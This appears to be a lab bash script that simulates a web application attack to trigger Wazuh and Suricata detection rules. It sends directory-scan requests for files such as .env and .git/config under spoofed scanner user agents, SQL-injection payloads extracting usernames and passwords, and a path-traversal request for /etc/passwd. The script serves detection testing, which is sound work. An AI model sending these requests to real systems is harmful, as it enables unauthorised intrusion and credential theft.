#!/usr/bin/env bash
#
# Simulation: Web application attack  (MITRE T1190)
#   -> fires Wazuh 100050 and Suricata 1000005 (SQLi) / 1000006 (scanner UA)
# --------------------------------------------------------------------------
# LAB USE ONLY. Sends scanner-style and SQL-injection HTTP requests at a target
# web app you own (e.g. DVWA on the victim VM).
#
# Usage:
#   bash run.sh TARGET_URL=http://192.168.1.60
#
set -euo pipefail
for a in "$@"; do case "$a" in *=*) export "${a%%=*}"="${a#*=}";; esac; done
TARGET_URL="${TARGET_URL:-http://127.0.0.1}"
TARGET_URL="${TARGET_URL%/}"

command -v curl >/dev/null 2>&1 || { echo "[x] curl is required"; exit 1; }

echo "=============================================================="
echo " [LAB] Web attack simulation  ->  $TARGET_URL"
echo "=============================================================="

req() { curl -s -o /dev/null -w "  %{http_code}  %s\n" -A "$1" "$2" || true; echo "        $2"; }

echo "[*] 1/3 Directory / file scan (scanner user-agent -> Suricata 1000006)"
for p in admin login.php wp-admin phpmyadmin .env .git/config backup.zip config.php.bak; do
  curl -s -o /dev/null -A "gobuster/3.6" "$TARGET_URL/$p" || true
done

echo "[*] 2/3 SQL injection attempts (-> Wazuh 100050 / Suricata 1000005)"
curl -s -o /dev/null -A "sqlmap/1.7" "$TARGET_URL/?id=1%20UNION%20SELECT%20username,password%20FROM%20users" || true
curl -s -o /dev/null "$TARGET_URL/product.php?id=1%27%20OR%20%271%27%3D%271" || true
curl -s -o /dev/null "$TARGET_URL/search?q=1%20UNION%20SELECT%20NULL,version()--" || true

echo "[*] 3/3 Path traversal attempt"
curl -s -o /dev/null "$TARGET_URL/index.php?page=../../../../etc/passwd" || true

echo "[+] Done. Dashboard filters:"
echo "      rule.id:100050"
echo "      rule.groups:suricata AND data.alert.signature_id:(1000005 OR 1000006)"
